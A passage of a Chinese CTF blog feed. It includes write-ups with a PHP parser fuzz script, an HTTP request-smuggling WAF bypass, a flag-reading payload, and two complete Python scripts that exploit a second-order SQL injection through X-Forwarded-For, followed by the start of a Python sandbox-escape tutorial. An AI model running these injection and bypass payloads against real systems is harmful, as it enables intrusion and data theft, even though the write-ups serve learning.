{        echo &quot;\033[999D\033[K\r&quot;;        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);        /* yes... I&apos;ve added a sleep time on each loop just for        the scenic effect :)like that movie with unrealistic        brute-force where the password are obtained        one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ        */        usleep(5000);        if(isset($o[&quot;foo_bar&quot;])) {            echo &quot;\033[999D\033[K\r&quot;;            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\n&quot;;        }    }    echo &quot;\033[999D\033[K\r&quot;;    echo &quot;\n&quot;;}</code></pre><p>这道题目经过测试参数前加一个 <code>%20</code>或者 <code>+</code> 来绕过</p><ol start="2"><li>http协议走私攻击</li></ol><blockquote><p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p></blockquote><p>这里我们通过 CL-CL 来Bypass</p><pre><code>POST /calc.php?num=phpinfo() HTTP/1.1Host: ********User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: keep-aliveReferer: **********Cookie: __cfduid=***********X-Forwarded-For: 127.0.0.1Content-Length: 7Content-Length: 7Content-Type: application/x-www-form-urlencodednum=111</code></pre><p>绕过waf之后还禁掉了一些字符不能直接读到 flag 。</p><p>先学习几个函数</p><ul><li>ord — 返回字符的 ASCII 码值</li><li>bin2hex — 函数把包含数据的二进制字符串转换为十六进制值</li><li>hex2bin — 转换十六进制字符串为二进制字符串</li><li>dechex — 十进制转换为十六进制</li><li>base_convert — 在任意进制之间转换数字</li><li>hexdec — 十六进制转换为十进制</li></ul><p>读取flag</p><pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h2><p>打开靶机，抓包发现响应头</p><pre><code>&lt;!-- Debug Info:  Duration: 0.058279037475586 s  Current Ip: 127.0.0.1 </code></pre><p>在 XFF 处尝试修改内容，发现可以修改成功。<code>Current Ip</code> 处显示当前的 XFF值，<code>Last Ip</code> 显示上次查询内容。执行 sleep() 语句 <code>1&#39; and sleep(3) and 1=&#39;1</code> 发现在第二次进行修改发包之后成功执行，存在二次注入。</p><p>所谓二次注入就是服务端在第一次接收脏数据时对数据进行了 <code>addslashes</code> 或 <code>mysql_escape_string</code>  处理，但是存入数据库时存的还是脏数据，于是在第二次查询时由于查询的是脏数据，信息仍然会泄露。</p><p>查看源码：</p><pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);$content = str_replace(&quot;&lt;a href=\&quot;&quot;, &quot;&lt;a href=\&quot;/?url=&quot;, $content);$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);echo($content);$end = microtime(true);$time = $end - $start;$last_ip = &quot;&quot;;$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);if(count($result) &gt; 0) {    if($ip !== $result[0][&apos;current_ip&apos;]) {        $last_ip = $result[0][&apos;current_ip&apos;];        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);    } else {        $last_ip = $result[0][&apos;last_ip&apos;];    }}query(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);die(&quot;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>可以看到在查询到数据之后，如果 <code>$ip !== $result[0][&#39;current_ip&#39;]</code> 那么 <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ，随后将 last_ip 不带过滤的带入数据库中查询。</p><p>所以我们注入的思路就是先将 exp 插入数据，然后再正常访问一次将数据带出。</p><p>exp:</p><pre><code>import requestsfrom time import sleepurl = &quot;http://node3.buuoj.cn:28063/&quot;s = requests.session()re = s.get(url)name = &apos;&apos;&quot;&quot;&quot;# database name# current db : ctf# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctffor i in range(1,100):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break&quot;&quot;&quot;&quot;&quot;&quot;# table name# ctf : ip_log# F4l9_D4t4B45e : F4l9_t4b1efor i in range(1,100):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            #print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break&quot;&quot;&quot;&quot;&quot;&quot;# column_name# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMnfor i in range(1,20):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            #print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break&quot;&quot;&quot;for i in range(1,100):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            #print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break</code></pre><p>这个太不优雅了，赵师傅的更优雅：</p><pre><code>#!/usr/bin/env python3import requeststarget = &quot;http://localhost:8302/&quot;def execute_sql(sql):    print(&quot;[*]请求语句：&quot; + sql)    return_result = &quot;&quot;    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;    session = requests.session()    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})    start_pos = r.text.find(&quot;Last Ip: &quot;)    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)    length = int(r.text[start_pos + 9: end_pos])    print(&quot;[+]长度：&quot; + str(length))    for i in range(1, length + 1, 5):        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})        start_pos = r.text.find(&quot;Last Ip: &quot;)        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)        result = int(r.text[start_pos + 9: end_pos])        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)        print(&quot;[+]位置 &quot; + str(i) + &quot; 请求五位成功:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))    return return_result# 获取数据库print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))# 获取数据库表print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos;&quot;))# 获取数据库表print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &apos;F4l9_D4t4B45e&apos; AND TABLE_NAME = &apos;F4l9_t4b1e&apos; &quot;))# 获取表中内容print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre><p>这里用的是 <code>1&#39;|&#39;1&#39;|&#39;1</code> 然后异或也可以 <code>1&#39;^&#39;0&#39;^&#39;1</code></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p><p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p><p><a href="https://paper.seebug.org/1048/#32-cl-cl" target="_blank" rel="noopener">https://paper.seebug.org/1048/#32-cl-cl</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python沙盒逃逸:从头开始</title>
      <link href="/2019/10/11/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2019/10/11/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>10/11/2019 2:26:44 PM </p><h1 id="Python-沙箱逃逸你真的看懂了么？"><a href="#Python-沙箱逃逸你真的看懂了么？" class="headerlink" title="Python 沙箱逃逸你真的看懂了么？"></a>Python 沙箱逃逸你真的看懂了么？</h1><p>python 沙箱逃逸就是在一个被严格限制了 python 执行环境中获取更高的权限，甚至 getshell ,这是我们的最终目的。但是在这之前我们需要绕过各种限制。</p><p>由于环境中限制了许多敏感模块比如 os 、 sys ，于是我们的重点变成了如何绕过限制去引入能执行我们想要的操作的模块。</p><p>接下来让我们先了解一下 python 的两个非常重要的东西</p><h2 id="type-amp-object"><a href="#type-amp-object" class="headerlink" title="type &amp; object"></a>type &amp; object</h2><p>在 python 里要查看一个类型的父类，使用它的 <strong>base</strong> 属性查看。  在 python 里查看一个实例的类型，使用它的 <strong>class</strong> 属性可以查看，或者使用 type() 函数查看。</p><pre><code>&gt;&gt;&gt; object&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; type&lt;type &apos;type&apos;&gt;</code></pre><p>他们都是 type 的一个实例，表示他们都是类型对象。</p><p>Python 中， object 是父子关系的顶端，所有数据类型的父类都是它； type 是类型实例关系的顶端，所有对象都是它的实例，他们的关系可以描述为: object 是一个 type (object is a instance of type)，即 Object 是 type 的一个实例。</p><pre><code>&gt;&gt;&gt; object.__class__&lt;type &apos;type&apos;&gt;&gt;&gt;&gt; object.__bases__  #站在食物链顶端的男人，没有父类()&gt;&gt;&gt; type.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; type.__class__    #type 的类型是自己&lt;type &apos;type&apos;&gt;</code></pre><p>我们再尝试引入一些内置数据类型来看看：</p><pre><code>&gt;&gt;&gt; list.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; type.__class__&lt;type &apos;type&apos;&gt;&gt;&gt;&gt; dict.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; dict.__class__&lt;type &apos;type&apos;&gt;</code></pre><p><strong>他们的父类都是 object , 类型都是 type</strong>，这点很重要！</p><p>我们把他们放在一个表里看看：</p><p><img src="https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg" alt></p><p>白板上的虚线表示源是目标的实例，实线表示源是目标的子类。即，左边的是右边的类型，而上面的是下面的父亲。</p><h2 id="builtin、builtins、builtins-是什么？"><a href="#builtin、builtins、builtins-是什么？" class="headerlink" title="builtin、builtins、builtins 是什么？"></a><strong>builtin</strong>、<strong>builtins</strong>、builtins 是什么？</h2><p>python 中有一个内建模块，该模块中有一些常用函数；而该模块在 Python 启动之后、且没有执行任何代码之前，python 会首先加载该内建函数到内存中。另外，该内建函数中的功能可以直接使用不需要添加任何内建模块前缀，其原因是对函数、变量、类等标识符的查找是按照 LE(N)GB 的规则</p><pre><code>locals -&gt; enclosing function -&gt; globals -&gt; builtins</code></pre><p>在 Python2.x 版本中，内建模块被命为 <code>__builtin__</code> , 而到了 Python3.x 版本更名为 <code>builtins</code> .</p><p>当使用内建模块中函数或其它功能时，可以直接使用，不用添加内建模块的名字;但是，如果想要向内建模块中添加一些功能，以便在任何函数中都能直接使用而不 用再进行import，这时，就要导入内建模块，在内建模块的命名空间(即 <strong>dict</strong> 字典属性)中添加该功能。在导入时，如果是 Python2.X 版本，就要导入 <code>__builtin__</code> 模块;如果是 Python3.X版本，就要导入builtins 模块。如：在 Python2.X 中，向内建模块添加 一个函数(该函数打印 “hello, world” )，可以这样写</p><pre><code>&gt;&gt;&gt; import __builtin__&gt;&gt;&gt; def print_hello():...     print &quot;hello world!&quot;...&gt;&gt;&gt; __builtin__.__dict__[&apos;hello&apos;]=print_hello&gt;&gt;&gt; print_hello()hello world!&gt;&gt;&gt; hello()hello world!</code></pre><p>此时， <code>print_hello</code> 和 <code>hello</code> 两个函数名几乎是一样，但是有一点区别，<code>print_hello</code>只能在该模块中使用，而 <code>hello</code> 可以在本程序中的其它任何一个模块中使用，因为 <code>hello</code> 已经放到内建模块中了。</p><p>说完了 <code>__builtin__</code> 和 <code>builtin</code> ,那 <code>__builtins__</code> 是什么？</p><p><code>__builtins__</code> 即是引用，也是在代码运行之前被加载到内存中。但是它们还有一点区别：</p><ol><li>无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入 <code>__builtin__</code> 内建模块;而对于 <code>__builtins__</code> 却不用导入，它在任何模块都直接可见</li><li>在主模块 <code>__main__</code> 中 <code>__builtins__</code> 是对内建模块 <code>__builtin__</code> 本身的引用，即 <code>__builtins__</code> 完全等价于 <code>__builtin__</code> ，二者完全是一个东西，不分彼此；在非主模块中 <code>__builtins__</code> 仅是对 <code>__builtin__</code> . <code>__dict__</code> 的引用，而非<code>__builtin__</code> 本身。它在任何地方都可见。此时 <code>__builtins__</code> 的类型是字典。</li></ol><p>我们打开 IDLE 看看这里面都有什么东西吧(Python 2.7)。</p><pre><code>&gt;&gt;&gt; dir(__builtins__)[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;WindowsError&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</code></pre><p>我们看到了常用的 <code>__import__</code> 、 <code>bin</code> 、 <code>eval</code> 等命令</p><p>好了，现在我们已经大致上知道了各个模块之间的关系了！</p><h2 id="Python-有哪些可以执行系统命令呢？"><a href="#Python-有哪些可以执行系统命令呢？" class="headerlink" title="Python 有哪些可以执行系统命令呢？"></a>Python 有哪些可以执行系统命令呢？</h2><p>os  commands  subprocess  timeit  platform  pty …</p><p>搬运一个测试所有导入 os 或者 sys 的库的脚本：</p><pre><code>#-*- coding:utf8 -*-# By Macr0phag3# in 2019-05-07 19:46:12# ------------------------------------# this, antigravity 库删掉all_modules_2 = [    &apos;BaseHTTPServer&apos;, &apos;imaplib&apos;, &apos;shelve&apos;, &apos;Bastion&apos;, &apos;anydbm&apos;, &apos;imghdr&apos;, &apos;shlex&apos;, &apos;CDROM&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;shutil&apos;, &apos;CGIHTTPServer&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;signal&apos;, &apos;Canvas&apos;, &apos;ast&apos;, &apos;imputil&apos;, &apos;site&apos;, &apos;ConfigParser&apos;, &apos;asynchat&apos;, &apos;inspect&apos;, &apos;sitecustomize&apos;, &apos;Cookie&apos;, &apos;asyncore&apos;, &apos;io&apos;, &apos;smtpd&apos;, &apos;DLFCN&apos;, &apos;atexit&apos;, &apos;itertools&apos;, &apos;smtplib&apos;, &apos;Dialog&apos;, &apos;audiodev&apos;, &apos;json&apos;, &apos;sndhdr&apos;, &apos;DocXMLRPCServer&apos;, &apos;audioop&apos;, &apos;keyword&apos;, &apos;socket&apos;, &apos;FileDialog&apos;, &apos;base64&apos;, &apos;lib2to3&apos;, &apos;spwd&apos;, &apos;FixTk&apos;, &apos;bdb&apos;, &apos;linecache&apos;, &apos;sqlite3&apos;, &apos;HTMLParser&apos;, &apos;binascii&apos;, &apos;linuxaudiodev&apos;, &apos;sre&apos;, &apos;IN&apos;, &apos;binhex&apos;, &apos;locale&apos;, &apos;sre_compile&apos;, &apos;MimeWriter&apos;, &apos;bisect&apos;, &apos;logging&apos;, &apos;sre_constants&apos;, &apos;Queue&apos;, &apos;bsddb&apos;, &apos;lsb_release&apos;, &apos;sre_parse&apos;, &apos;ScrolledText&apos;, &apos;bz2&apos;, &apos;macpath&apos;, &apos;ssl&apos;, &apos;SimpleDialog&apos;, &apos;cPickle&apos;, &apos;macurl2path&apos;, &apos;stat&apos;, &apos;SimpleHTTPServer&apos;, &apos;cProfile&apos;, &apos;mailbox&apos;, &apos;statvfs&apos;, &apos;SimpleXMLRPCServer&apos;, &apos;cStringIO&apos;, &apos;mailcap&apos;, &apos;string&apos;, &apos;SocketServer&apos;, &apos;calendar&apos;, &apos;markupbase&apos;, &apos;stringold&apos;, &apos;StringIO&apos;, &apos;cgi&apos;, &apos;marshal&apos;, &apos;stringprep&apos;, &apos;TYPES&apos;, &apos;cgitb&apos;, &apos;math&apos;, &apos;strop&apos;, &apos;Tix&apos;, &apos;chunk&apos;, &apos;md5&apos;, &apos;struct&apos;, &apos;Tkconstants&apos;, &apos;cmath&apos;, &apos;mhlib&apos;, &apos;subprocess&apos;, &apos;Tkdnd&apos;, &apos;cmd&apos;, &apos;mimetools&apos;, &apos;sunau&apos;, &apos;Tkinter&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;sunaudio&apos;, &apos;UserDict&apos;, &apos;codecs&apos;, &apos;mimify&apos;, &apos;symbol&apos;, &apos;UserList&apos;, &apos;codeop&apos;, &apos;mmap&apos;, &apos;symtable&apos;, &apos;UserString&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sys&apos;, &apos;_LWPCookieJar&apos;, &apos;colorsys&apos;, &apos;multifile&apos;, &apos;sysconfig&apos;, &apos;_MozillaCookieJar&apos;, &apos;commands&apos;, &apos;multiprocessing&apos;, &apos;syslog&apos;, &apos;__builtin__&apos;, &apos;compileall&apos;, &apos;mutex&apos;, &apos;tabnanny&apos;, &apos;__future__&apos;, &apos;compiler&apos;, &apos;netrc&apos;, &apos;talloc&apos;, &apos;_abcoll&apos;, &apos;contextlib&apos;, &apos;new&apos;, &apos;tarfile&apos;, &apos;_ast&apos;, &apos;cookielib&apos;, &apos;nis&apos;, &apos;telnetlib&apos;, &apos;_bisect&apos;, &apos;copy&apos;, &apos;nntplib&apos;, &apos;tempfile&apos;, &apos;_bsddb&apos;, &apos;copy_reg&apos;, &apos;ntpath&apos;, &apos;termios&apos;, &apos;_codecs&apos;, &apos;crypt&apos;, &apos;nturl2path&apos;, &apos;test&apos;, &apos;_codecs_cn&apos;, &apos;csv&apos;, &apos;numbers&apos;, &apos;textwrap&apos;, &apos;_codecs_hk&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;_codecs_iso2022&apos;, &apos;curses&apos;, &apos;operator&apos;, &apos;thread&apos;, &apos;_codecs_jp&apos;, &apos;datetime&apos;, &apos;optparse&apos;, &apos;threading&apos;, &apos;_codecs_kr&apos;, &apos;dbhash&apos;, &apos;os&apos;, &apos;time&apos;, &apos;_codecs_tw&apos;, &apos;dbm&apos;, &apos;os2emxpath&apos;, &apos;timeit&apos;, &apos;_collections&apos;, &apos;decimal&apos;, &apos;ossaudiodev&apos;, &apos;tkColorChooser&apos;, &apos;_csv&apos;, &apos;difflib&apos;, &apos;parser&apos;, &apos;tkCommonDialog&apos;, &apos;_ctypes&apos;, &apos;dircache&apos;, &apos;pdb&apos;, &apos;tkFileDialog&apos;, &apos;_ctypes_test&apos;, &apos;dis&apos;, &apos;pickle&apos;, &apos;tkFont&apos;, &apos;_curses&apos;, &apos;distutils&apos;, &apos;pickletools&apos;, &apos;tkMessageBox&apos;, &apos;_curses_panel&apos;, &apos;doctest&apos;, &apos;pipes&apos;, &apos;tkSimpleDialog&apos;, &apos;_elementtree&apos;, &apos;dumbdbm&apos;, &apos;pkgutil&apos;, &apos;toaiff&apos;, &apos;_functools&apos;, &apos;dummy_thread&apos;, &apos;platform&apos;, &apos;token&apos;, &apos;_hashlib&apos;, &apos;dummy_threading&apos;, &apos;plistlib&apos;, &apos;tokenize&apos;, &apos;_heapq&apos;, &apos;email&apos;, &apos;popen2&apos;, &apos;trace&apos;, &apos;_hotshot&apos;, &apos;encodings&apos;, &apos;poplib&apos;, &apos;traceback&apos;, &apos;_io&apos;, &apos;ensurepip&apos;, &apos;posix&apos;, &apos;ttk&apos;, &apos;_json&apos;, &apos;errno&apos;, &apos;posixfile&apos;, &apos;tty&apos;, &apos;_locale&apos;, &apos;exceptions&apos;, &apos;posixpath&apos;, &apos;turtle&apos;, &apos;_lsprof&apos;, &apos;fcntl&apos;, &apos;pprint&apos;, &apos;types&apos;, &apos;_md5&apos;, &apos;filecmp&apos;, &apos;profile&apos;, &apos;unicodedata&apos;, &apos;_multibytecodec&apos;, &apos;fileinput&apos;, &apos;pstats&apos;, &apos;unittest&apos;, &apos;_multiprocessing&apos;, &apos;fnmatch&apos;, &apos;pty&apos;, &apos;urllib&apos;, &apos;_osx_support&apos;, &apos;formatter&apos;, &apos;pwd&apos;, &apos;urllib2&apos;, &apos;_pyio&apos;, &apos;fpformat&apos;, &apos;py_compile&apos;, &apos;urlparse&apos;, &apos;_random&apos;, &apos;fractions&apos;, &apos;pyclbr&apos;, &apos;user&apos;, &apos;_sha&apos;, &apos;ftplib&apos;, &apos;pydoc&apos;, &apos;uu&apos;, &apos;_sha256&apos;, &apos;functools&apos;, &apos;pydoc_data&apos;, &apos;uuid&apos;, &apos;_sha512&apos;, &apos;future_builtins&apos;, &apos;pyexpat&apos;, &apos;warnings&apos;, &apos;_socket&apos;, &apos;gc&apos;, &apos;quopri&apos;, &apos;wave&apos;, &apos;_sqlite3&apos;, &apos;genericpath&apos;, &apos;random&apos;, &apos;weakref&apos;, &apos;_sre&apos;, &apos;getopt&apos;, &apos;re&apos;, &apos;webbrowser&apos;, &apos;_ssl&apos;, &apos;getpass&apos;, &apos;readline&apos;, &apos;whichdb&apos;, &apos;_strptime&apos;, &apos;gettext&apos;, &apos;repr&apos;, &apos;wsgiref&apos;, &apos;_struct&apos;, &apos;glob&apos;, &apos;resource&apos;, &apos;xdrlib&apos;, &apos;_symtable&apos;, &apos;grp&apos;, &apos;rexec&apos;, &apos;xml&apos;, &apos;_sysconfigdata&apos;, &apos;gzip&apos;, &apos;rfc822&apos;, &apos;xmllib&apos;, &apos;_sysconfigdata_nd&apos;, &apos;hashlib&apos;, &apos;rlcompleter&apos;, &apos;xmlrpclib&apos;, &apos;_testcapi&apos;, &apos;heapq&apos;, &apos;robotparser&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;hmac&apos;, &apos;runpy&apos;, &apos;zipfile&apos;, &apos;_warnings&apos;, &apos;hotshot&apos;, &apos;sched&apos;, &apos;zipimport&apos;, &apos;_weakref&apos;, &apos;htmlentitydefs&apos;, &apos;select&apos;, &apos;zlib&apos;, &apos;_weakrefset&apos;, &apos;htmllib&apos;, &apos;sets&apos;, &apos;abc&apos;, &apos;httplib&apos;, &apos;sgmllib&apos;, &apos;aifc&apos;, &apos;ihooks&apos;, &apos;sha&apos;]all_modules_3 = [    &apos;AptUrl&apos;, &apos;hmac&apos;, &apos;requests_unixsocket&apos;, &apos;CommandNotFound&apos;, &apos;apport&apos;, &apos;hpmudext&apos;, &apos;resource&apos;, &apos;Crypto&apos;, &apos;apport_python_hook&apos;, &apos;html&apos;, &apos;rlcompleter&apos;, &apos;DistUpgrade&apos;, &apos;apt&apos;, &apos;http&apos;, &apos;runpy&apos;, &apos;HweSupportStatus&apos;, &apos;apt_inst&apos;, &apos;httplib2&apos;, &apos;scanext&apos;, &apos;LanguageSelector&apos;, &apos;apt_pkg&apos;, &apos;idna&apos;, &apos;sched&apos;, &apos;NvidiaDetector&apos;, &apos;aptdaemon&apos;, &apos;imaplib&apos;, &apos;secrets&apos;, &apos;PIL&apos;, &apos;aptsources&apos;, &apos;imghdr&apos;, &apos;secretstorage&apos;, &apos;Quirks&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;select&apos;, &apos;UbuntuDrivers&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;selectors&apos;, &apos;UbuntuSystemService&apos;, 